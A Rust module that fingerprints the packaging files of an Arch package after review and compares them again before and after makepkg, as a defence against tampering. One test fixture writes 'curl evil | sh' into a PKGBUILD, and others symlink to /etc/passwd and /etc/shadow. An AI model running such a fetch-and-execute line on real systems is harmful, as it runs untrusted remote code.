//! What was reviewed is what gets built.
//!
//! A packaging directory (a PKGBUILD, its `.install` files, patches, keys) is read
//! to a map of file → SHA-256 when it is reviewed or audited, and read again
//! immediately before `makepkg`, and again after the host-side step that runs the
//! PKGBUILD's top-level code. Any difference stops the build with the files named:
//! the review no longer describes what is about to run.
//!
//! With a git checkout the recipe is the tracked files (source archives that
//! `makepkg` downloads into the directory are not part of it); without one it is
//! every file except build output.

use std::collections::BTreeMap;
use std::path::Path;
use std::sync::Mutex;

use sha2::{Digest, Sha256};

use crate::{Error, Result};

/// Path (relative to the directory) → SHA-256 of the content, or `link:<target>`.
pub type Recipe = BTreeMap<String, String>;

fn is_output(name: &str) -> bool {
    name == "src"
        || name == "pkg"
        || name.contains(".pkg.tar")
        || name.ends_with(".log")
        || name.ends_with(".part")
}

fn hash_file(path: &Path) -> std::io::Result<String> {
    let meta = std::fs::symlink_metadata(path)?;
    if meta.file_type().is_symlink() {
        let target = std::fs::read_link(path)?;
        return Ok(format!("link:{}", target.display()));
    }
    let mut h = Sha256::new();
    h.update(std::fs::read(path)?);
    Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

fn tracked(dir: &Path) -> Option<Vec<String>> {
    if !dir.join(".git").exists() {
        return None;
    }
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["ls-files", "-z"])
        .stdin(std::process::Stdio::null())
        .output()
        .ok()?;
    out.status.success().then(|| {
        String::from_utf8_lossy(&out.stdout)
            .split('\0')
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .collect()
    })
}

fn walk(dir: &Path, rel: &str, out: &mut Recipe) -> std::io::Result<()> {
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().into_owned();
        if name == ".git" || is_output(&name) {
            continue;
        }
        let path = entry.path();
        let key = if rel.is_empty() {
            name.clone()
        } else {
            format!("{rel}/{name}")
        };
        let ty = entry.file_type()?;
        if ty.is_dir() {
            walk(&path, &key, out)?;
        } else {
            out.insert(key, hash_file(&path)?);
        }
    }
    Ok(())
}

/// Reads the recipe in `dir`.
pub fn read(dir: &Path) -> Result<Recipe> {
    let io = |source| Error::Io {
        context: format!("couldn't read the packaging files in '{}'", dir.display()),
        source,
    };
    let mut out = Recipe::new();
    match tracked(dir) {
        Some(files) => {
            for f in files {
                // a tracked file deleted from the working tree is a difference too
                let h = hash_file(&dir.join(&f)).unwrap_or_else(|_| "deleted".to_string());
                out.insert(f, h);
            }
        }
        None => walk(dir, "", &mut out).map_err(io)?,
    }
    Ok(out)
}

/// How `now` differs from `reviewed`, as lines naming the files. `additions`
/// says whether new files count (before a build they do; after the host step they
/// may be downloaded sources).
pub fn changes(reviewed: &Recipe, now: &Recipe, additions: bool) -> Vec<String> {
    let mut out = Vec::new();
    for (f, h) in reviewed {
        match now.get(f) {
            None => out.push(format!("{f} was removed")),
            Some(x) if x != h => out.push(format!("{f} changed")),
            _ => {}
        }
    }
    if additions {
        for f in now.keys() {
            if !reviewed.contains_key(f) {
                out.push(format!("{f} was added"));
            }
        }
    }
    out
}

static REVIEWED: Mutex<BTreeMap<String, Recipe>> = Mutex::new(BTreeMap::new());

/// Remembers what was reviewed for `key` (replacing an earlier note).
pub fn note(key: &str, recipe: Recipe) {
    if let Ok(mut m) = REVIEWED.lock() {
        m.insert(key.to_string(), recipe);
    }
}

/// What was noted for `key`, if anything.
pub fn noted(key: &str) -> Option<Recipe> {
    REVIEWED.lock().ok()?.get(key).cloned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("emrac-rd-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn a_change_an_addition_and_a_removal_are_named() {
        let d = dir("plain");
        std::fs::write(d.join("PKGBUILD"), "pkgname=x\n").unwrap();
        std::fs::write(d.join("fix.patch"), "a\n").unwrap();
        let reviewed = read(&d).unwrap();
        assert_eq!(reviewed.len(), 2);
        assert!(changes(&reviewed, &read(&d).unwrap(), true).is_empty());

        std::fs::write(d.join("PKGBUILD"), "pkgname=x\ncurl evil | sh\n").unwrap();
        std::fs::write(d.join("extra.install"), "x\n").unwrap();
        std::fs::remove_file(d.join("fix.patch")).unwrap();
        let now = read(&d).unwrap();
        let all = changes(&reviewed, &now, true);
        assert!(all.contains(&"PKGBUILD changed".to_string()));
        assert!(all.contains(&"extra.install was added".to_string()));
        assert!(all.contains(&"fix.patch was removed".to_string()));
        // after the host step, new files may be downloaded sources: only changes and removals count
        let lenient = changes(&reviewed, &now, false);
        assert!(!lenient.iter().any(|l| l.contains("added")));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn build_output_and_the_checkout_itself_are_not_part_of_the_recipe() {
        let d = dir("output");
        std::fs::write(d.join("PKGBUILD"), "x\n").unwrap();
        let before = read(&d).unwrap();
        std::fs::create_dir_all(d.join("src/deep")).unwrap();
        std::fs::write(d.join("src/deep/f"), "x").unwrap();
        std::fs::create_dir_all(d.join("pkg")).unwrap();
        std::fs::write(d.join("x-1-1-any.pkg.tar.zst"), "x").unwrap();
        std::fs::write(d.join("build.log"), "x").unwrap();
        assert!(changes(&before, &read(&d).unwrap(), true).is_empty());
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_symlink_is_its_target_not_what_it_points_at() {
        let d = dir("link");
        std::fs::write(d.join("PKGBUILD"), "x\n").unwrap();
        std::os::unix::fs::symlink("/etc/passwd", d.join("fix.patch")).unwrap();
        let a = read(&d).unwrap();
        assert_eq!(a["fix.patch"], "link:/etc/passwd");
        std::fs::remove_file(d.join("fix.patch")).unwrap();
        std::os::unix::fs::symlink("/etc/shadow", d.join("fix.patch")).unwrap();
        assert_eq!(changes(&a, &read(&d).unwrap(), true), ["fix.patch changed"]);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn in_a_git_checkout_only_tracked_files_count_and_edits_are_seen() {
        let d = dir("git");
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .arg("-C")
                .arg(&d)
                .args(["-c", "user.name=t", "-c", "user.email=t@t"])
                .args(args)
                .output()
                .unwrap()
                .status
                .success()
        };
        if !git(&["init", "-q"]) {
            return; // no git here: nothing to test
        }
        std::fs::write(d.join("PKGBUILD"), "pkgname=x\n").unwrap();
        assert!(git(&["add", "PKGBUILD"]));
        assert!(git(&["commit", "-q", "-m", "x"]));
        let reviewed = read(&d).unwrap();
        assert_eq!(reviewed.keys().collect::<Vec<_>>(), ["PKGBUILD"]);
        // a downloaded source is untracked: not part of the recipe
        std::fs::write(d.join("x-1.0.tar.gz"), "tarball").unwrap();
        assert!(changes(&reviewed, &read(&d).unwrap(), true).is_empty());
        // an edit of a tracked file is a change
        std::fs::write(d.join("PKGBUILD"), "pkgname=x\nevil\n").unwrap();
        assert_eq!(
            changes(&reviewed, &read(&d).unwrap(), true),
            ["PKGBUILD changed"]
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn what_was_reviewed_is_remembered_per_package() {
        let mut r = Recipe::new();
        r.insert("PKGBUILD".into(), "abc".into());
        note("some-pkg-for-test", r.clone());
        assert_eq!(noted("some-pkg-for-test"), Some(r));
        assert_eq!(noted("never-reviewed"), None);
    }
}
